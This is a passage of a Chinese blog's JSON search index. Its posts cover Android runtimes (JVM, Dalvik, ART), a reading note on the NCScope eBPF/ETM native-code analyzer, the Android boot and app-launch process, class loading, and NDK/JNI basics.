DEX 文件，同时对现有应用提供兼容。 ART 的工作原理 安装时编译：应用安装过程中，ART 使用 AOT 编译器将 DEX 文件直接转换为机器码，生成可执行oat文件（ELF文件），存储在设备的 /data 分区中。 运行时： ART 直接执行预编译的机器码，避免了 JIT 的实时编译开销。 ART 支持垃圾回收（GC），减少内存碎片，提高应用响应速度。 4. 三者的对比总结 特性 JVM Dalvik ART 主要用途 桌面、服务器 Java 应用 Android 应用运行环境 Android 应用运行环境 字节码格式 .class 文件（Java 字节码） .dex 文件（优化字节码） .dex 文件 架构类型 基于栈 基于寄存器 基于寄存器 编译模式 JIT JIT（后期引入） AOT + JIT + 混合编译 启动速度 较慢（依赖 JIT） 中等 快速（AOT 优化） 运行效率 中等 较低 高效 内存占用 较高 较低 较低 垃圾回收 多种 GC 策略 简单 GC 并发 GC，暂停时间短 适用环境 通用计算设备 移动设备 现代移动设备 选择 Dalvik 和 ART 的原因 为什么 Android 不使用 JVM？ JVM 面向通用计算设备，内存和资源占用较大，不适合早期的移动设备。 Dalvik 针对 Android 的需求进行了优化，例如轻量化的寄存器架构和 DEX 格式。 为什么从 Dalvik 过渡到 ART？ Dalvik 的 JIT 编译在性能上无法满足现代移动设备的需求，启动时间和运行效率存在瓶颈。 ART 引入了 AOT 编译和更高效的内存管理，显著提升了应用性能。","categories":[],"tags":[],"keywords":[]},{"title":"论文阅读-ncscope:Hardware-Assisted Analyzer for Native Code in Android Apps","slug":"论文阅读NScope","date":"2024-11-19T03:06:05.000Z","updated":"2024-11-20T11:28:41.556Z","comments":true,"path":"2024/11/19/论文阅读NScope/","link":"","permalink":"http://example.com/2024/11/19/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BBNScope/","excerpt":"","text":"调研什么是ebpf eBPF（extended Berkeley Packet Filter）可以在Linux内核中运行沙盒程序，而无需更改内核源代码或加载内核模块。换句话说，eBPF 是一种内核中的轻量级虚拟机，可以动态加载和运行经过验证的用户定义程序。 对比web端，eBPF扮演了JavaScript的相似角色，由于HTML和Linux的内核都不太可制定，eBPF的出现，为linux提供了一种安全稳定的内核扩展方法。 官方社区：eBPF - Introduction, Tutorials &amp; Community Resources 详细介绍：eBPF 完全入门指南.pdf（万字长文） - 知乎 当前ebf与安卓现状：Android还未对eBPF程序的动态加载做出较好的支持（），但Android内核本身对eBPF的支持已较为全面 目前方法，大多基于 adeb&#x2F;eadb 在 Android 内核基础上构建 Linux 沙箱使用 eBPF 扩展内核 | Android Open Source Project 一些成果电子科技大学的专利： 一种基于eBPF的Android恶意流量实时捕获和检测的方法及系统-CN118540143A - 专利顾如 一种基于eBPF的Android软件脱壳方法及系统-CN117852037A - 专利顾如 香港理工大学的 Xiapu Luo 老师，2022论文 NCScope: hardware-assisted analyzer for native code in Android apps | Proceedings of the 31st ACM SIGSOFT International Symposium on Software Testing and Analysis 一种基于ebf的恶意软件检测框架 [2105.14344] BPFroid: Robust Real Time Android Malware Detection Framework 加州大学的论文 Sifter | Proceedings of the 28th Annual International Conference on Mobile Computing And Networking 一些开发者项目： eBPF - SeeFlowerX-插桩 旁观者 - eBPF技术强力驱动，无需CA证书即可捕获HTTPS&#x2F;TLS明文数据包。 | eCapture eBPF初体验：Android设备网络优化实践 - 魅族内核团队 tiann&#x2F;eadb: eBPF Android Debug Bridge eBPF 能干什么？系统调用监控 应用程序插桩 抓包 在 Android 中使用 eBPF：开篇 | Weishu’s Notes 论文阅读概述本文使用ETM和eBPF，实现以较低的开销，高保真执行跟踪的native层代码检测方法。 介绍静态分析，以及动态分析的动态二进制插装，模拟器（QEMU），debug调试方法具有局限性: 1.不能准确高效的识别指令。 2.很难绕过反分析代码，由于他们的特征。（市面上还未大范围使用针对eBPF的反调试） 3.这些方法有很大的开销，从而导致误差，恶意软件也可以此做出反侦察（定时检查）。 论文的优点 1.通过ETM收集ARM指令的开销非常低 2.eBPF高效的获得app的内存数据 实现：ETM是ARM平台的一项硬件功能。它通过监控指令总线跟踪CPU执行的指令。 eBPF（extended Berkeley Packet Filter）可以在Linux内核中运行沙盒程序，而无需更改内核源代码或加载内核模块。换句话说，eBPF 是一种内核中的轻量级虚拟机，可以动态加载和运行经过验证的用户定义程序。 NCScope构成： 1.一个基于ARMv8的数据收集模块，运行加载了eBPF程序的安卓系统。 2.分析模块：自保护识别，反分析检测，内存崩溃bug诊断，性能分析（单独PC运行） 运行流程： 基于APP无Root权限的假设，NCScope 指示 ETM 记录应用程序执行的指令，并调用 eBPF 程序从应用程序的虚拟内存中检索数据并保存。 traceETM 记录 CPU 执行的每个间接分支指令的目标地址 亮点：NCScope实现了 ETM 的上下文 ID 跟踪和分支广播跟踪。 收集内存数据NCScope 利用 eBPF 在运行时收集应用程序的内存数据，（hook住系统调用函数） 获取将数据存储在内存中的基址。 通过eBPF的bpf_probe_read读取数据。 亮点： 1.通过eBPF实现内存数据的过滤，只保存所要分析的app数据。 2.对 eBPF 获取的数据添加时间戳，然后根据时间戳对获取到的内存数据进行排序，以此推断调用顺序。 分析模块恢复运行时函数调用为 NCScope 开发了一个新的 ETM 流解析器。 构建指令-函数映射 NCScope 首先通过分析应用程序的内存映射以及系统库和框架 OAT 文件的反汇编信息，构建系统函数与其指令地址之间的映射。 查找调用的系统函数。 NCScope 可以通过将 ETM 流中记录的指令地址映射到系统函数来恢复应用程序的运行时函数调用。 确定native代码调用的系统函数 NCScope 按如下方式确定这两种类型的native函数调用的系统函数。 1.由于 JNI_OnLoad 由系统库 libart.so 中定义的系统函数 JavaVMExt：：LoadNativeLibrary 调用，因此 NCScope 利用此观察结果来查找 JNI_OnLoad 执行的系统函数。 2.由于 Android 框架会在执行每个 JNI 函数之前调用系统库 libart.so 中定义的系统函数 art：：artQuickGenericJniTrampoline，然后在执行 JNI 函数之后调用函数 art：：artQuickGenericJniEndTrampoline，因此 NCScope 会利用此观察结果来查找由常见原生函数执行的系统函数。 检测自我保护方法root检测，Root Detection (RTD)和篡改检测，Tampering Detection (TPD)方法总结 检测反分析机制Debugger 检测Debugger Detection (DBD)、仿真器检测Emulator Detection (EMD)、DBI 框架检测DBI Framework Detection (DFD)、计时检查Timing Check (TCK)和动态代码加载Dynamic Code Loading (DCL)。 内存奔溃bug检测NCScope 可以通过恢复其运行时数据流来诊断应用程序原生代码中的两种类型的内存损坏错误，包括 CWE-416（use-after-free） 和 CWE-415（double-free） NCScope 采用离线符号执行，通过跟踪执行跟踪中每条指令的数据值，恢复应用程序的运行时数据流。 扩展 NCScope添加新的检测规则，可以执行三个步骤来添加新规则，以检测新的自我保护方法和&#x2F;或反分析机制。 1.决定可用于检测它们的必要系统函数和参数值 2.开发eBPF 程序来指示 eBPF 记录此类内存数据 3.检查是否访问了系统函数的必要参数值。 或者增加新的规则在离线符号执行中。 可以通过扩展分析模块来检查调用的系统函数和应用程序本机代码在运行时访问的内存数据，从而向 NCScope 添加新功能 评估NCScope 部署在 Juno r2 开发板上，运行带有 4.14.59 Android 通用内核的 Android 9.0 系统。 开销NCScope 带来的额外开销来自两个方面：跟踪已执行的指令（使用 ETM）;以及检索内存数据（利用 eBPF）。 表 4 显示了结果，其中 Slowdown 列提供了 NCScope 带来的减速时间。我们观察到 ETM（即指令跟踪）不会减慢被分析应用程序的执行速度，而 eBPF（即内存数据检索）只给总分带来了 1.175 倍的减速。 NCScope 会给执行所分析的应用程序带来非常小的额外开销。 自我保护方法的检测效率我们从 Google Play 下载 900 多个随机选择的金融应用程序，并挑选出 500 个具有原生代码的示例，包括 170 个手机银行应用程序、152 个数字钱包应用程序、21 个汇款应用程序、41 个加密货币应用程序、31 个个人贷款应用程序、20 个保险应用程序和 65 个股票交易应用程序。 NCScope 可以精确识别应用程序在本机代码中的自我保护行为。它发现，在接受评估的金融应用程序中，只有 26.8% 在原生代码中实现了自我保护方法，这意味着它们的安全性远非预期 反分析方法的检测效率我们从一家安全公司获取了 450 个恶意应用程序，发现其中 300 个具有原生代码，可以在 NCScope 上正常运行 NCScope 可以精确识别本机代码中的反分析行为。它发现，至少 78.3% 的被评估恶意软件在本机代码中实施了反分析方法。 内存崩溃诊断从 NIST C&#x2F;C++ Juliet 套件 [23]（CWE 的开源测试用例集合）中，我们将 CWE-416（释放后使用）和 CWE-415（双重释放）的 20 个有缺陷和 40 个无错误的测试用例改编为 60 个 Android 应用程序的原生代码。然后，我们应用 NCScope 来诊断这些应用程序原生代码中的内存损坏错误。 NCScope 可以通过识别本机代码中的 use-after-free 和 double-free 来帮助诊断内存损坏。 性能分析NCScope 发现，使用系统函数 fwrite 将大量数据写入文件比使用 write 花费的时间更少，这两者都在 libc.so 中定义。 NCScope 可以通过收集噪声很小的准确数据来帮助对本机代码进行性能分析。 有效性的威胁首先，由于动态分析的内在问题，NCScope 可能无法触发被分析应用程序的所有指令，因此可能会错过尚未执行的行为。 其次，NCScope 可能会错过新的自我保护和反分析行为，这些行为不包括检测规则。 第三，应用程序可能会通过侧信道检测 NCScope 以逃避分析。 相关工作对于native的代码检测，只有少数静态检测方法，部分动态检测基于QEMU，无法分析具有仿真器检测行为的反分析应用程序。 部分动态检测基于App执行重量级操作（例如信息流跟踪）时，会带来大量开销，因此他们无法分析具有计时检查行为的反分析应用 ptrace 和 DBI 框架 Valgrind 分别用于分析应用程序。因此，它们受到 Debugger 检测 或DBI 框架检测 行为的阻碍 Ninja [ 和 Happer 使用 ETM 跟踪应用程序和硬件断点来检索内存数据。但是，它们都不是为分析本机代码的行为而设计的，并且不会恢复数据流。 总结NCScope通过 ETM 收集执行跟踪，通过 eBPF 收集相关内存数据，并配备了新的方法来检查native代码，额外开销非常低。使用 NCScope，我们分别对金融应用程序和恶意应用程序中基于原生代码的自我保护方法和反分析方法进行了系统研究，观察到金融应用程序没有得到很好的保护，但恶意软件采用了各种反分析方法。此外，NCScope 可以帮助诊断内存损坏错误和对应用程序本机代码进行性能分析。","categories":[],"tags":[],"keywords":[]},{"title":"安卓系统加载流程浅析","slug":"安卓系统加载流程浅析","date":"2024-11-14T14:22:29.000Z","updated":"2024-11-25T00:50:12.240Z","comments":true,"path":"2024/11/14/安卓系统加载流程浅析/","link":"","permalink":"http://example.com/2024/11/14/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E6%B5%85%E6%9E%90/","excerpt":"","text":"Android系统启动流程 加载Bootloader–&gt;初始化内核————&gt;启动init进程————&gt;init进程fork出Zygote进程–&gt;zygote进程fork出Systemserver进程 引导层：手机开机后，引导芯片启动，引导芯片开始从固化在ROM里的预设代码执行，加载引导程序到到RAM，BootLoader检查RAM，初始化硬件参数等功能； 主要任务是将操作系统加载到内存中并建立好操作系统运行的环境，然后将控制权转移到操作系统内核。 例子：nexus 5x 按住音量调低键，然后按住电源键。进入bootloader 内核层：Kernel层主要加载一些硬件设备驱动，初始化进程管理等操作。在Kernel中首先启动swapper进程（pid&#x3D;0），用于初始化进程管理，内容管理，加载Driver等操作，再启动kthread进程（pid&#x3D;2），这些1inux系统的内核进程，Kthread是所有内核教程的鼻祖。 Native层：启动初始化进程管理等操作会启动init进程，这些在Native层中，init进程是所有进程的鼻祖，解析执行init.rc,到app_process孵化zygote进程。Zygote进程会预加载大量的Java类和资源，以提高应用程序的启动速度。当用户启动新的应用程序时，Zygote进程会复制自身并生成新的虚拟机实例，然后加载对应应用程序的代码并执行。 java框架层：zygote进程会加载虚拟机，启动System_Server进程。System Server是整个Android系统中非常重要的一个进程，负责启动并管理多种系统服务，例如Activity Manager、Window Manager、PackageManager等。在这个阶段，用户才可以看到开始界面，开始使用手机。 应用层SystemServer阶段会启动Binder线程池，创建SystemServiceManager管理系统服务，之后启动各种系统服务，其中包括Launcher，就是我们的系统桌面。 Zygote进程Zygote 是 Android 系统中非常重要的一个进程，它是所有应用进程的母体进程，负责创建和管理 Android 应用的运行环境。Zygote 的设计思想是通过进程复制（fork）机制，提高应用程序启动的效率，同时也减少了内存的使用和系统资源的消耗。 Zygote 的启动过程(1）Zygote 启动 当 Android 系统启动时，init 进程会根据启动脚本（/init.rc 文件）来启动 Zygote 进程。 init 进程会调用 Zygote 可执行文件（通常为 /system/bin/app_process），通过 app_process 启动 Zygote 的主方法com.android.internal.os.ZygoteInit.main()。 （2）加载 Android 系统库和框架类 Zygote 进程启动后，会首先加载一系列系统库和资源，包括 Android 的核心类库、系统框架等。这些库会被所有应用程序共享。 例如，Zygote 会预加载 Android SDK 中的核心类（如 android.app.*、android.content.* 等），以及一些重要的系统资源，以便所有应用程序都可以快速访问这些类和资源。 （3）创建 Socket 接口 Zygote 创建一个 Zygote Socket 接口，用于与 System Server 及其他系统组件通信。当应用启动请求到来时，Zygote 通过这个 Socket 接收启动请求并进行进程复制（fork）。 （4）启动 System Server 进程 在 Zygote 启动的过程中，Zygote 进程会首先创建一个关键的系统进程 —— System Server。 System Server 是 Android 系统服务的核心，它包含窗口管理、活动管理、包管理等系统服务。通过 fork 机制，Zygote 生成 System Server 进程后，System Server 初始化并启动各种系统服务，使 Android 系统具备完整的功能。 （5）进入等待状态 在完成初始化任务后，Zygote 进入一个等待状态，等待通过 Zygote Socket 接收应用进程启动请求。 每当有应用启动请求到来时，Zygote 进程会 fork 一个新的进程来运行该应用。 在native主要作用：startVM创建虚拟机-startVM函数 1.配置虚拟机参数：startVM 函数会设置一些虚拟机启动参数，包括堆大小、垃圾回收策略等。根据不同的设备性能和内存情况，Android 系统可以调整这些参数来优化性能。 2.创建虚拟机实例：startVM 会调用 Android 虚拟机（ART 或 Dalvik）的 API 来创建一个新的虚拟机实例（JNIEnv 指针），并将它绑定到当前 Zygote 进程中。 3.初始化 Java 类库：一旦虚拟机实例创建完成，Zygote 会在虚拟机中加载和初始化 Android 的核心 Java 类库。这些类库将为所有应用程序提供公共的运行环境。 startReg注册JNI函数-startReg startReg 函数：此函数的任务是将本地（Native）方法绑定到 Java 方法，使得 Native 层代码可以调用 Java 层代码。 1.加载系统库和函数：startReg 会注册 Android 系统中的关键 JNI 函数，这些函数允许 Native 代码调用 Java 层的功能。 2.绑定 JNI 函数：系统中许多核心组件都依赖于 JNI。通过 startReg 函数，Zygote 进程将必要的 JNI 函数注册到虚拟机环境中，使得本地代码能够访问系统服务，例如内存管理、文件系统、网络等资源。 3.与 Java 交互：通过 JNI 函数的注册，Android 系统的 Native 层（C&#x2F;C++ 编写）和 Java 层可以互相调用，达到良好的协同运行效果。 ZygoteInit.main通过JNI知道Java层的com.android.internal.os.ZygoteInit类，调用main函数，法入java世界 ZygoteInit.main 方法：这是 Java 层的入口点，用于初始化 Zygote 进程并启动 Android 系统的服务。 初始化系统服务：ZygoteInit.main 方法首先会启动 System Server 进程，这是 Android 系统的核心服务进程。System Server 负责启动和管理系统中几乎所有的核心服务，包括 Activity Manager Service、Package Manager Service、Window Manager Service 等。 启动 Zygote Socket：ZygoteInit.main 方法还会创建一个 Socket 接口，名为 Zygote Socket。这个 Socket 用于接收来自 Activity Manager Service 的新应用启动请求。每当用户启动应用时，Activity Manager 会通过此 Socket 向 Zygote 发送请求，Zygote 再 fork 新进程来启动该应用。 等待应用请求：完成 System Server 和 Zygote Socket 的初始化后，ZygoteInit.main 方法会使 Zygote 进入一个等待状态，持续等待应用启动请求。当收到请求时，Zygote 会根据请求参数来 fork 一个新的应用进程，并加载指定的应用。 Android应用程序启动流程应用的启动1 AMS启动Launcher SystemServer启动了一个更加重要的服务Activity Manager Service (AMS) ，AMS其中很重要的一个作用就是启动Launcher进程。Launcher进程是用户与设备交互的核心入 AMS发送启动应用程序进程请求：AMS首先会调用startProcessLocked方法，最终通过openZygoteSocketIfNeeded方法与Zygote 的Socket建立连接，并通过zygoteSendArgsAndGetResult与进程进行通信，发送请求。 2 发送启动应用程序进程请求 当用户点击桌面上的应用图标时，首先发生的事情是 Launcher 应用程序调用 startActivity() 方法来启动目标应用的 MainActivity（或其它指定的 Activity）。 startActivity() 方法调用的实际底层是通过 Binder IPC（进程间通信）来与系统服务进行交互的。 通过Binder，调用system_server进程中AMS服务的startActivity方法，发送启动请求. 3 Zygote进程接收请求并创建应用程序进程 当 Activity Manager Service (AMS) 收到启动请求后，它需要创建一个新的进程来运行目标应用。由于 Android 系统使用 Zygote 进程来fork所有应用进程，AMS 会向 Zygote 发送一个进程创建的请求。 Zygote进程接收请求并创建应用程序进程：Zygote通过runSelectLoop方法接收到AMS的请求，然后调用runOnce方法，通过forkAndSpecialize方法创建应用程序进程。 4应用程序进程的初始化 在 Zygote 进程中创建新的应用进程后，系统会继续执行应用进程中的 ActivityThread 类的 main() 方法。这个方法是 Android 应用进程启动的入口，它负责执行应用进程的初始化操作。 应用程序进程初始化和运行：应用程序进程创建完成后，首先会通过handleParentProc开始进行初始化工作，启动Binder线程池，最后通过抛出异常的方式调用MethodAndArgsCaller来启动应用程序进程，即进入到ActivityThread的main方法，创建并启动主线程的消息循环，进入阻塞状态。 5应用程序进程的运行 当 ActivityThread.main() 被调用后，ActivityThread 进程会继续执行以下几个关键步骤： **创建 Handler 和 Looper**： Android 的 Handler 和 Looper 构成了一个消息队列机制，它们帮助应用程序处理异步事件。每个应用进程都会有一个主线程，主线程会有一个 Looper，负责从消息队列中读取消息并通过 Handler 来处理。 在应用启动时，ActivityThread 会创建一个 Handler 对象，它负责处理 UI 事件和系统消息。 **bindApplication()**： bindApplication() 是 ActivityThread 在启动时调用的一个方法，用于绑定应用的 Application 类。 在 bindApplication() 中，ActivityThread 会初始化应用的环境，设置 Context，执行 Application 类的 onCreate() 方法等。这些初始化操作会确保应用在启动后可以正确运行。 **初始化应用并启动 Activity**：ActivityThread 会初始化应用的 Application 类，并启动目标 Activity。 Activity的启动在 Zygote 进程通过 fork() 创建出新的应用进程之后，ActivityThread 类会执行应用进程的初始化工作。ActivityThread 负责启动应用的 Application 类、加载启动的 Activity 等。 初始化—-&gt; 在 Android 系统中，**Application** 类是每个应用的入口点之一，它会在整个应用程序的生命周期内持续存在，负责全局初始化和一些资源的配置。**Application** 的初始化流程通常是在 Activity 的生命周期之前执行的。当应用启动时，ActivityThread 会首先创建一个 Application 类的实例。这个 Application 类是在整个应用生命周期中唯一存在的对象。 Application 类是整个应用的入口点，它在应用启动时就需要进行初始化操作，而 MainActivity 只是用户界面的入口点，Activity 的生命周期方法是在 Application 初始化之后才会开始执行的 Application的构造函数—-&gt; 当 ActivityThread 创建 Application 实例时，系统会调用 Application 类的构造函数。此时，Application 实例已经被创建出来，但它尚未完成完全的初始化。 注意：Application 的构造函数在整个应用的生命周期中只会调用一次。 12345public class MyApplication extends Application &#123; public MyApplication() &#123; // 应用的构造函数 &#125;&#125; Application.attachBaseContext()——&gt; attachBaseContext() 是 Application 类中的一个重要方法，它会在 onCreate() 之前被调用。这个方法主要是为了将 Context 绑定到 Application 上。实际上，Context 是 Android 中非常重要的一个概念，它提供了应用环境的一些功能，如访问资源、启动活动、访问文件系统等。 在调用 attachBaseContext() 时，系统会将 Context 对象传递给 Application，并确保 Application 在执行任何任务之前已经具有了适当的上下文。 12345@Overridepublic void attachBaseContext(Context base) &#123; super.attachBaseContext(base); // 在这里执行一些需要在 onCreate() 前完成的操作&#125; attachBaseContext() 方法常常用于执行一些与上下文（Context）相关的初始化操作，像是配置一些全局的设置，或者注入一些依赖等。 Application.onCreate（）函数–&gt; onCreate() 方法是 Application 类的核心方法之一，它在应用的整个生命周期内只会被调用一次。它会在 attachBaseContext() 调用之后执行，用于执行更复杂的初始化操作，例如全局配置、SDK 初始化、资源加载等。 12345@Overridepublic void onCreate() &#123; super.onCreate(); // 初始化应用级的资源或服务&#125; 最后才会进入MainActivity中的attachBaseContext函数、onCreate函数等等 MainActivity 会首先调用 attachBaseContext() 方法，它的作用和 Application 类中的 attachBaseContext() 类似：为 Activity 提供合适的 Context。但与 Application 的 attachBaseContext() 不同，Activity 的 attachBaseContext() 是在创建 Activity 之前调用的，因此可以用来处理一些与上下文相关的初始化工作。 在完成 attachBaseContext() 调用后，系统会调用 MainActivity 的 onCreate() 方法。此时，MainActivity 已经完全准备好，可以执行 UI 的初始化和其他业务逻辑。 类加载流程类的加载分为 1装载(Load),2.链接（Link），3.初始化（Intialize） 在 Android（以及 Java）系统中，类加载 是一个分层的过程，主要涉及到 Native 层和 Java 层之间的交互。 双亲委派机制：加载.class文件时，以递归的形式逐级向上委托给父加载器ParentClassLoader加载，如果加载过了，就不用再加载一遍如果父加载器没有加载过，继续委托给父加载器去加载，一直到这条链路的顶级，顶级classLoader如果没有加载过，则尝试加载，加载失败，逐级向下交还调用者加载 （1）先检查自己是否已经加载过class文件，用findLoadedClass方法，如果已经加载了直接返回（2）如果自己没有加载过，存在父类，则委派父类去加载，用parent.loadClass(name,false)方法，此时会向上传递，然后去父加载器中循环第1步，一直到顶级ClassLoader（3）如果父类没有加载，则尝试本级classLoader加载，如果加载失败了就会向下传递，交给调用方式实现.class文件的加载 123456789101112131415161718192021222324252627282930//路径：/libcore/ojluni/src/main/java/java/lang/ClassLoader.javaprotected Class&lt;?&gt; loadClass(String name, boolean resolve) throws ClassNotFoundException&#123; // 先检查是否已经加载过了该类 Class&lt;?&gt; c = findLoadedClass(name); if (c == null) &#123; try &#123; if (parent != null) &#123;//没有加载该类，且存在父加载器，交给父加载器处理 c = parent.loadClass(name, false); &#125; else &#123;//没有加载该类，且不存在父加载器 c = findBootstrapClassOrNull(name); &#125; &#125; catch (ClassNotFoundException e) &#123; // ClassNotFoundException thrown if class not found // from the non-null parent class loader &#125; if (c == null) &#123; //父加载器处理失败，自己来找 c = findClass(name); &#125; &#125; return c;&#125;private Class&lt;?&gt; findBootstrapClassOrNull(String name)&#123; return null;&#125; 作用： 123(1) 防止同一个.class文件重复加载(2) 对于任意一个类确保在虚拟机中的唯一性.由加载它的类加载器和这个类的全类名一同确立其在Java虚拟机中的唯一性(3) 保证.class文件不被篡改，通过委派方式可以保证系统类的加载逻辑不被篡改 DefineClass-&gt; DefineClass 是加载类的第一步，通常是在 Native 层调用的。 DefineClass 的主要作用是将类的字节码（从 .dex 文件中读取）转换成一个可以被虚拟机识别的对象格式。 在 Android 中，.dex 文件包含应用中所有的类，系统会通过 DefineClass 从 dex 中读取字节码并定义类。 这个过程通常会调用到 Android 的 Runtime 库中的 ClassLoader，它的 defineClass() 方法负责将 .dex 文件中的字节码转换成 Class 对象。 &#96;&#96;&#96;C++&#x2F;&#x2F; 在 native 层的 defineClass 实现Class* defineClass(JNIEnv* env, const char* name, jobject loader, const unsigned char* buf, int len); 1234567891011121314151617181920212223242526通过 `DefineClass` 过程，虚拟机会创建一个 `Class` 对象，该对象包含类的基本信息，比如类名、父类、接口等元数据。**LoadClass-&gt;**`LoadClass` 是类加载的核心步骤，它负责查找并加载指定的类，并将其标记为“已加载”状态。- 如果类已经被加载过，`LoadClass` 会直接返回该类的 `Class` 对象；如果类没有被加载，则会通过 `ClassLoader` 执行实际的类加载操作。- 在 `LoadClass` 过程中，系统会遍历父类和接口，递归加载相关依赖的类，以确保依赖类都被正确加载。在 `Native` 层，`LoadClass` 的实现调用了 `Java` 层的 `ClassLoader.loadClass()` 方法，该方法会在系统类加载器和自定义类加载器之间进行选择，确保类从合适的源（如系统 `jar` 包或应用的 `dex` 文件）中加载。**LoadClassMembers-&gt;**在类被加载后，系统会进入 **`LoadClassMembers`** 阶段，这个阶段用于加载类中的字段和方法定义（即成员变量和方法）。- **字段加载**：系统会为类的所有字段分配内存，并初始化字段的默认值（对于对象引用通常为 `null`，对于基本数据类型如 `int` 为 `0`）。- **方法加载**：系统会为类的每个方法加载其字节码或原生实现。在 `LoadClassMembers` 阶段，系统会遍历类的结构信息，将类的字段和方法转换成虚拟机的内部格式。系统会生成方法表（Method Table）和字段表（Field Table），为后续的调用和操作提供必要的数据结构。```java// native 层的 loadClassMembers 函数void loadClassMembers(JNIEnv* env, jclass clazz) &#123; // 通过 JNI 获取类的字段和方法，并生成内部表示&#125; LoadMethod–&gt; LoadMethod 是 LoadClassMembers 的一部分，专门用于加载类中的方法。 每个方法都会被转换成虚拟机的指令集格式或其对应的 Native 代码（如果是 native 方法）。 在 LoadMethod 过程中，虚拟机会为每个方法生成一个方法描述符，用于标识方法的名称、参数和返回类型。 对于普通的 Java 方法，系统会将 .dex 文件中的 dalvik 或 ART 字节码转换成虚拟机内部的指令格式。 对于 native 方法，会调用 JNI 的 RegisterNativeMethods() 方法，来将该方法与其对应的 C&#x2F;C++ 函数绑定起来。 1234// 加载每个方法的字节码或者注册 native 方法void loadMethod(JNIEnv* env, jmethodID method) &#123; // 加载方法实现的字节码或原生代码&#125; LinkCode—&gt; LinkCode 是将方法代码与虚拟机的运行环境链接起来的过程，这也是类加载过程中的最后一个准备阶段。 链接字节码：虚拟机会将字节码解析为机器码或解释执行代码，确保方法在调用时能够执行。 生成本地机器代码：在现代的 ART 虚拟机上，会在 LinkCode 阶段触发即时编译（JIT 编译），将常用的字节码转换成本地机器码，以提高执行效率。 方法引用解析：在 LinkCode 过程中，虚拟机会解析类中的符号引用（例如方法调用、字段访问），并将其链接到实际的内存地址上。 在 LinkCode 完成后，类的所有方法和字段都可以被有效地调用和访问。这个阶段确保类的所有依赖已经被解析，类的字节码能够正常运行。 1234// 链接代码void linkCode(JNIEnv* env, jclass clazz) &#123; // 解析字节码，生成 JIT 编译代码&#125; Execute 完成以上步骤后，类已经加载完毕，可以开始执行实际的代码。Execute 是整个类加载过程的最终阶段。 在 Execute 阶段，虚拟机会通过调用特定的 Entry Point（即方法入口）来执行代码。 当调用某个方法时，虚拟机会在方法表中查找该方法的入口地址，然后开始执行对应的字节码或机器码。 若方法执行过程中需要访问其他类，会触发递归加载，确保所有依赖类都已完成加载和链接。 执行的过程通常分为解释执行和 JIT 编译执行两种。ART 虚拟机会通过即时编译（JIT）或预编译（AOT）来将常用的代码编译成机器码，以提升应用的执行效率。 流程 DefineClass：定义类，加载 .dex 文件中的字节码，并创建 Class 对象。 LoadClass：加载类，确保类及其依赖类都已经加载到内存中。 LoadClassMembers：加载类的成员（字段和方法），构建类的字段表和方法表。 LoadMethod：加载类的方法，解析方法的字节码或绑定 native 方法。 LinkCode：链接类代码，将字节码解析为机器码，生成可执行代码。 Execute：执行代码，通过方法入口开始执行字节码或机器码。 类加载：隐式加载和显式加载隐式加载是指由系统自动完成类的加载过程。它是类加载最常见的一种形式. 由 JVM 自动管理：程序员无需显式调用类加载方法，JVM 根据需求自动加载类。 按需加载：只有当程序运行到需要某个类时，虚拟机才会加载该类。 (1)创建类的实例,也就是new一个对象(2)访问某个类或接口的静态变量,或者对该静态变量赋值(3)调用类的静态方法(4)反射Class.forName(“android.app.ActivityThread”) 显示加载：是指通过编程方式显式地告诉 JVM 加载某个类。显式加载通常使用 反射机制 实现，例如通过 Class.forName() 或自定义 ClassLoader。 (1)使用Loadclass（）加载不会初始化，允许开发者继承 ClassLoader 并实现自己的类加载逻辑。 (2)使用forName（）加载会初始化。自动触发类的静态代码块和静态字段初始化。 (3）通过ClassLoader.loadClass()可以使用已有的类加载器（如系统类加载器）显式加载类。 Class.forName 和 ClassLoader.loadClass加载有何不同：（1）ClassLoader.loadClass也能加载一个类,但是不会触发类的初始化(也就是说不会对类的静态变量,静态代码块进行初始化操作（2）Class.forName这种方式,不但会加载一个类,还会触发类的初始化阶段,也能够为这个类的静态变量,静态代码块进行初始化操作 隐式加载与显式加载的对比 特点 隐式加载 显式加载 触发方式 由 JVM 自动触发 由程序员显式调用 典型场景 常规类加载（new、静态字段、继承等） 反射、动态代理、自定义类加载器等 初始化行为 自动执行静态代码块和静态字段的初始化 可控制是否初始化 灵活性 较低，完全依赖 JVM 机制 高，可按需实现自定义逻辑 实现复杂度 简单，适合常见场景 较高，需要了解类加载器的实现细节 典型方法 隐式由 JVM 调用类加载器的 loadClass() 方法 Class.forName()、ClassLoader.loadClass() 等","categories":[],"tags":[],"keywords":[]},{"title":"NDK","slug":"NDK","date":"2024-10-29T16:00:00.000Z","updated":"2024-11-11T09:24:00.978Z","comments":true,"path":"2024/10/30/NDK/","link":"","permalink":"http://example.com/2024/10/30/NDK/","excerpt":"","text":"基础介绍NDK（Native Development Kit）是 Android 的一个工具集，允许开发者使用 C 和 C++ 语言编写 Android 应用程序中的一部分代码 NDK 工具包中提供了完整的一套将 c&#x2F;c++ 代码编译成静态&#x2F;动态库的工具，而 Android.mk 和 Application.mk 你可以认为是描述编译参数和一些配置的文件。比如指定使用 c++11 还是 c++14 编译，会引用哪些共享库，并描述关系等，还会指定编译的 abi。只有有了这些 NDK 中的编译工具才能准确的编译 c&#x2F;c++ 代码。 ndk-build 文件是 Android NDK r4 中引入的一个 shell 脚本。其用途是调用正确的 NDK 构建脚本。其实最终还是会去调用 NDK 自己的编译工具。 那 CMake 又是什么呢。脱离 Android 开发来看，c&#x2F;c++ 的编译文件在不同平台是不一样的。Unix 下会使用 makefile 文件编译，Windows 下会使用 project 文件编译。而 CMake 则是一个跨平台的编译工具，它并不会直接编译出对象，而是根据自定义的语言规则（CMakeLists.txt）生成 对应 makefile 或 project 文件，然后再调用底层的编译。 NDK、CMake、LLDB 的作用 https://developer.android.com/ndk/guides JNIJNI（Java Native Interface）是一个 Java 提供的编程框架，允许 Java 代码与其他语言（主要是 C 和 C++）编写的代码进行交互。JNI 使得 Java 应用程序能够调用本地（native）方法，实现与平台相关的功能，或者利用已有的 C&#x2F;C++ 代码库。 从 Java 调用 Native 或从 Native 调用 Java 的成本很高，使用 JNI 时要限制跨越 JNI 边界的调用次数； Java 的 native 方法和 JNI 函数是一一对应的映射关系，建立这种映射关系的注册方式有 2 种： 方式 1 - 静态注册： 基于命名约定建立映射关系； 方式 2 - 动态注册： 通过 JNINativeMethod 结构体建立映射关系。 ABI 与指令集不同的 Android 